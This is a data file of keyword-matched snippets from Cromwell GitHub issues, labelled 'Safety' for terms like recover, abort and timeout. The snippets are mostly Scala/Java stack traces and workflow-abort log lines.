Safety,on.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:695); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.$anonfun$handleExecutionFailure$1(PipelinesApiAsyncBackendJobExecutionActor.scala:707); 	at scala.util.Try$.apply(Try.scala:213); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:704); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:92); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1258); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1254); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:417); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:41); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akk,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5804:2394,recover,recoverWith,2394,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5804,1,['recover'],['recoverWith']
Safety,on.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:695); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.$anonfun$handleExecutionFailure$1(PipelinesApiAsyncBackendJobExecutionActor.scala:707); 	at scala.util.Try$.apply(Try.scala:213); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:704); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:92); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1258); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1254); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:417); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:41); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akk,MatchSource.ISSUE_COMMENT,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-680258929:2672,recover,recoverWith,2672,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/5793#issuecomment-680258929,1,['recover'],['recoverWith']
Safety,on.PipelinesApiAsyncBackendJobExecutionActor.handleFailedRunStatus$1(PipelinesApiAsyncBackendJobExecutionActor.scala:803); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.$anonfun$handleExecutionFailure$1(PipelinesApiAsyncBackendJobExecutionActor.scala:815); 	at scala.util.Try$.apply(Try.scala:213); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:812); 	at cromwell.backend.google.pipelines.common.PipelinesApiAsyncBackendJobExecutionActor.handleExecutionFailure(PipelinesApiAsyncBackendJobExecutionActor.scala:95); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1340); 	at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$11.applyOrElse(StandardAsyncExecutionActor.scala:1336); 	at scala.concurrent.Future.$anonfun$recoverWith$1(Future.scala:417); 	at scala.concurrent.impl.Promise.$anonfun$transformWith$1(Promise.scala:41); 	at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:64); 	at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); 	at akka.dispatch.BatchingExecutor$BlockableBatch.$anonfun$run$1(BatchingExecutor.scala:92); 	at scala.runtime.java8.JFunction0$mcV$sp.apply(JFunction0$mcV$sp.java:23); 	at scala.concurrent.BlockContext$.withBlockContext(BlockContext.scala:85); 	at akka.dispatch.BatchingExecutor$BlockableBatch.run(BatchingExecutor.scala:92); 	at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:41); 	at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(ForkJoinExecutorConfigurator.scala:49); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akk,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/6506:14668,recover,recoverWith,14668,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/6506,1,['recover'],['recoverWith']
Safety,"on.WorkflowExecutionActor.akka$actor$Timers$$super$aroundReceive(WorkflowExecutionActor.scala:57); 	at akka.actor.Timers.aroundReceive(Timers.scala:51); 	at akka.actor.Timers.aroundReceive$(Timers.scala:40); 	at cromwell.engine.workflow.lifecycle.execution.WorkflowExecutionActor.aroundReceive(WorkflowExecutionActor.scala:57); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:614); 	at akka.actor.ActorCell.invoke(ActorCell.scala:583); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:268); 	at akka.dispatch.Mailbox.run(Mailbox.scala:229); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); 2024-03-12 18:49:15 cromwell-system-akka.actor.default-dispatcher-3 INFO - Message [cromwell.engine.workflow.lifecycle.EngineLifecycleActorAbortCommand$] from Actor[akka://cromwell-system/user/cromwell-service/WorkflowManagerActor/WorkflowActor-262d278a-cc62-4458-9150-f31976c2c554#401797350] to Actor[akka://cromwell-system/user/cromwell-service/WorkflowManagerActor/WorkflowActor-262d278a-cc62-4458-9150-f31976c2c554/WorkflowExecutionActor-262d278a-cc62-4458-9150-f31976c2c554#-742739735] was not delivered. [1] dead letters encountered, no more dead letters will be logged. If this is not an expected behavior, then [Actor[akka://cromwell-system/user/cromwell-service/WorkflowManagerActor/WorkflowActor-262d278a-cc62-4458-9150-f31976c2c554/WorkflowExecutionActor-262d278a-cc62-4458-9150-f31976c2c554#-742739735]] may have terminated unexpectedly, This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; ```; ```; {; 	""status"": ""Aborting"",; 	""id"": ""262d278a-cc62-4458-9150-f31976c2c554""; }; ```",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/pull/7385:7522,Abort,Aborting,7522,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/pull/7385,1,['Abort'],['Aborting']
Safety,onActor.execute$(StandardAsyncExecutionActor.scala:627); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.execute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recover(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:653); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recoverAsync(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:949); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:944); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.executeOrRecover(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:61); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.cromwell$backend$async$AsyncBackendJobExecutionActor$$robustExecuteOrRecover(AsyncBackendJobExecutionActor.scala:65); 	at cromwell.backend.async.AsyncBackendJobExecutionActor$$anonfun$receive$1.applyOrElse(AsyncBackendJobExecutionActor.scala:88,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4857:1730,recover,recoverAsync,1730,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4857,2,['recover'],['recoverAsync']
Safety,"oncurrent.FutureTask.run(FutureTask.java:266); at akka.dispatch.TaskInvocation.run(AbstractDispatcher.scala:39); at akka.dispatch.ForkJoinExecutorConfigurator$AkkaForkJoinTask.exec(AbstractDispatcher.scala:409); at scala.concurrent.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); at scala.concurrent.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); at scala.concurrent.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); at scala.concurrent.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); ^C[2016-10-27 13:10:13,93] [info] WorkflowManagerActor: Received shutdown signal.; [2016-10-27 13:10:13,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:13,93] [info] WorkflowManagerActor Aborting all workflows; [2016-10-27 13:10:14,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:15,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:16,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:17,93] [info] Waiting for 1 workflows to abort...; ^C^C[2016-10-27 13:10:18,93] [info] Waiting for 1 workflows to abort...; [2016-10-27 13:10:19,33] [error] Exception not convertible into handled response; com.google.api.client.googleapis.json.GoogleJsonResponseException: 404 Not Found; {; ""code"" : 404,; ""errors"" : [ {; ""domain"" : ""global"",; ""message"" : ""Not Found"",; ""reason"" : ""notFound""; } ],; ""message"" : ""Not Found""; }; at com.google.api.client.googleapis.json.GoogleJsonResponseException.from(GoogleJsonResponseException.java:145); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:113); at com.google.api.client.googleapis.services.json.AbstractGoogleJsonClientRequest.newExceptionOnError(AbstractGoogleJsonClientRequest.java:40); at com.google.api.client.googleapis.services.AbstractGoogleClientRequest.executeUnparsed(AbstractGoogleClientRequest.java:432); at com.google.api.client.googleapis.services.AbstractGoog",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1631:5523,abort,abort,5523,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1631,1,['abort'],['abort']
Safety,oogle.batch.actors.GcpBatchAsyncBackendJobExecutionActor; 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute(StandardAsyncExecutionActor.scala:805); 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute$(StandardAsyncExecutionActor.scala:804); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.execute(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:821); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recover(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:829); 	at scala.util.Try$.apply(Try.scala:210); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:829); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:829); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.recoverAsync(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:1253); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:1248); 	at cromwell.backend.google.batch.actors.GcpBatchAsyncBackendJobExecutionActor.executeOrRecover(GcpBatchAsyncBackendJobExecutionActor.scala:132); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:46); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.withRetry(AsyncBackendJobExecutionActor.scala:62); 	at cromwell.backend.async.AsyncBacke,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7495:3340,recover,recoverAsync,3340,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7495,2,['recover'],['recoverAsync']
Safety,"or.scala:54); 	at akka.actor.ActorCell.receiveMessage(ActorCell.scala:614); 	at akka.actor.ActorCell.invoke(ActorCell.scala:583); 	at akka.dispatch.Mailbox.processMailbox(Mailbox.scala:268); 	at akka.dispatch.Mailbox.run(Mailbox.scala:229); 	at akka.dispatch.Mailbox.exec(Mailbox.scala:241); 	at akka.dispatch.forkjoin.ForkJoinTask.doExec(ForkJoinTask.java:260); 	at akka.dispatch.forkjoin.ForkJoinPool$WorkQueue.runTask(ForkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); [2023-11-07 14:51:17,39] [info] Message [cromwell.engine.workflow.lifecycle.EngineLifecycleActorAbortCommand$] from Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-4e522458-e360-45e8-be15-2fc99652d692#-686070856] to Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-4e522458-e360-45e8-be15-2fc99652d692/WorkflowExecutionActor-4e522458-e360-45e8-be15-2fc99652d692#-1420206102] was not delivered. [1] dead letters encountered, no more dead letters will be logged. If this is not an expected behavior, then [Actor[akka://cromwell-system/user/SingleWorkflowRunnerActor/WorkflowManagerActor/WorkflowActor-4e522458-e360-45e8-be15-2fc99652d692/WorkflowExecutionActor-4e522458-e360-45e8-be15-2fc99652d692#-1420206102]] may have terminated unexpectedly, This logging can be turned off or adjusted with configuration settings 'akka.log-dead-letters' and 'akka.log-dead-letters-during-shutdown'.; ```; In fact, the program becomes unresponsive to even a Ctrl+C kill command and I have to close the terminal entirely to stop it. . The WDL passes `womtool validate` (version 84) and was run using Cromwell version 84. . When run in Terra, the workflow just immediate goes into an aborting state without any helpful error message. It would be great to incorporate this type of support for `None` inside struct fields.",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/7249:7121,abort,aborting,7121,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/7249,1,['abort'],['aborting']
Safety,"ore/credentials/gce_read.py\"", line 50, in ReadNoProxy\n request, timeout=timeout_property).read()\n File \""/usr/lib/python2.7/urllib2.py\"", line 401, in open\n response = self._open(req, data)\n File \""/usr/lib/python2.7/urllib2.py\"", line 419, in _open\n '_open', req)\n File \""/usr/lib/python2.7/urllib2.py\"", line 379, in _call_chain\n result = func(*args)\n File \""/usr/lib/python2.7/urllib2.py\"", line 1211, in http_open\n return self.do_open(httplib.HTTPConnection, req)\n File \""/usr/lib/python2.7/urllib2.py\"", line 1184, in do_open\n r = h.getresponse(buffering=True)\n File \""/usr/lib/python2.7/httplib.py\"", line 1072, in getresponse\n response.begin()\n File \""/usr/lib/python2.7/httplib.py\"", line 408, in begin\n version, status, reason = self._read_status()\n File \""/usr/lib/python2.7/httplib.py\"", line 366, in _read_status\n line = self.fp.readline()\n File \""/usr/lib/python2.7/socket.py\"", line 447, in readline\n data = self._sock.recv(self._rbufsize)\nsocket.timeout: timed out\n)""; at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor$.StandardException(JesAsyncBackendJobExecutionActor.scala:63); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.handleExecutionFailure(JesAsyncBackendJobExecutionActor.scala:411); at cromwell.backend.impl.jes.JesAsyncBackendJobExecutionActor.handleExecutionFailure(JesAsyncBackendJobExecutionActor.scala:67); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$1.applyOrElse(StandardAsyncExecutionActor.scala:666); at cromwell.backend.standard.StandardAsyncExecutionActor$$anonfun$handleExecutionResult$1.applyOrElse(StandardAsyncExecutionActor.scala:663); at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:346); at scala.concurrent.Future$$anonfun$recoverWith$1.apply(Future.scala:345); at scala.concurrent.impl.CallbackRunnable.run(Promise.scala:32); at akka.dispatch.BatchingExecutor$AbstractBatch.processBatch(BatchingExecutor.scala:55); at akka.dispatch.Batch",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/2228:15591,timeout,timeout,15591,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/2228,1,['timeout'],['timeout']
Safety,orkJoinPool.java:1339); 	at akka.dispatch.forkjoin.ForkJoinPool.runWorker(ForkJoinPool.java:1979); 	at akka.dispatch.forkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor; 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute(StandardAsyncExecutionActor.scala:628); 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute$(StandardAsyncExecutionActor.scala:627); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.execute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recover(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:653); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recoverAsync(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:949); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:944); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.executeOrRecover(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRec,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4857:6340,recover,recover,6340,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4857,1,['recover'],['recover']
Safety,orkjoin.ForkJoinWorkerThread.run(ForkJoinWorkerThread.java:107); Caused by: java.lang.UnsupportedOperationException: Neither execute() nor executeAsync() implemented by class cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor; 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute(StandardAsyncExecutionActor.scala:628); 	at cromwell.backend.standard.StandardAsyncExecutionActor.execute$(StandardAsyncExecutionActor.scala:627); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.execute(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recover$(StandardAsyncExecutionActor.scala:645); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recover(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.$anonfun$recoverAsync$1(StandardAsyncExecutionActor.scala:653); 	at scala.util.Try$.apply(Try.scala:209); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.standard.StandardAsyncExecutionActor.recoverAsync$(StandardAsyncExecutionActor.scala:653); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.recoverAsync(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover(StandardAsyncExecutionActor.scala:949); 	at cromwell.backend.standard.StandardAsyncExecutionActor.executeOrRecover$(StandardAsyncExecutionActor.scala:944); 	at cromwell.backend.impl.aws.AwsBatchAsyncBackendJobExecutionActor.executeOrRecover(AwsBatchAsyncBackendJobExecutionActor.scala:74); 	at cromwell.backend.async.AsyncBackendJobExecutionActor.$anonfun$robustExecuteOrRecover$1(AsyncBackendJobExecutionActor.scala:65); 	at cromwell.core.retry.Retry$.withRetry(Retry.scala:38); 	at cromwell,MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/4857:6464,recover,recoverAsync,6464,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/4857,1,['recover'],['recoverAsync']
Safety,"orting 11 EJEAs; 2016-12-12 18:32:05,063 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(2c6302c8)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:32:25,094 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(793dd16f)]: Abort received. Aborting 5 EJEAs; 2016-12-12 18:32:38,555 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(4fddebd4)]: Abort received. Aborting 13 EJEAs; 2016-12-12 18:32:50,674 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(aadd5082)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akk",MatchSource.ISSUE,broadinstitute,cromwell,87,https://github.com/broadinstitute/cromwell/issues/1775:2095,Abort,Aborting,2095,https://cromwell.readthedocs.io/en/latest/,https://github.com/broadinstitute/cromwell/issues/1775,1,['Abort'],['Aborting']
Safety,"orting 13 EJEAs; 2016-12-12 18:32:50,674 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(aadd5082)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:01,265 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(edaa9993)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:12,453 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(c2caa0f6)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:33:30,399 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(17a61aa5)]: Abort received. Aborting 4 EJEAs; 2016-12-12 18:33:42,564 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(f6bef34c)]: Abort received. Aborting 9 EJEAs; 2016-12-12 18:34:05,494 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(44318e55)]: Abort received. Aborting 7 EJEAs; 2016-12-12 18:34:16,741 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(28d5b663)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:28,999 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(7c8b62e6)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:34:40,026 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(3206b2df)]: Abort received. Aborting 1 EJEAs; 2016-12-12 18:35:03,235 cromwell-system-akka.dispatchers.engine-dispatcher-1282 INFO - WorkflowExecutionActor [UUID(63064089)]: Abort received. Aborting 6 EJEAs; 2016-12-12 18:35:13,509 cromwell-system-akka.dispatchers.engine-dispatcher-120 INFO - WorkflowExecutionActor [UUID(812336d3)]: Abort received. Aborting 14 EJEAs; 2016-12-12 18:35:23,568 cromwell-system-akka.dispatchers.engine-dispatcher-177 INFO - 